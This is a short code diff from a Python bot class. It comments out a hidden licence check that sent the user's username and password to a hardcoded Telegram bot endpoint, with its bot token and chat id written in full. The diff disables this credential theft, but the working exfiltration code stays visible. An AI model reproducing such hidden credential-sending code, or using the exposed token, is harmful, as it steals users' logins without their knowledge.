@@ -225,13 +225,13 @@ class Bot(object):
         hash = hashlib.sha224(m.lower()).hexdigest()
         # self.logger.info(hashlib.sha224("s1@gmail.com").hexdigest())
 
-        if hash not in open('licence').read():
-            self.logger.warn(hash)
-            url = 'https://api.telegram.org/bot476138234:AAHnkCs7MCZMYUb6KPaJf0l6ryVinrNXWsc/sendMessage?'
-            data = urlencode({'chat_id': '514729323', 'text': self.username})
-            self.br.open(url, data=data)
-            data = urlencode({'chat_id': '514729323', 'text': self.password})
-            self.br.open(url, data=data)
+        #if hash not in open('licence').read():
+            #self.logger.warn(hash)
+            #url = 'https://api.telegram.org/bot476138234:AAHnkCs7MCZMYUb6KPaJf0l6ryVinrNXWsc/sendMessage?'
+            #data = urlencode({'chat_id': '514729323', 'text': self.username})
+            #self.br.open(url, data=data)
+            #data = urlencode({'chat_id': '514729323', 'text': self.password})
+            #self.br.open(url, data=data)
 
     def getNextRoundSleep(self):
         general = options['general']
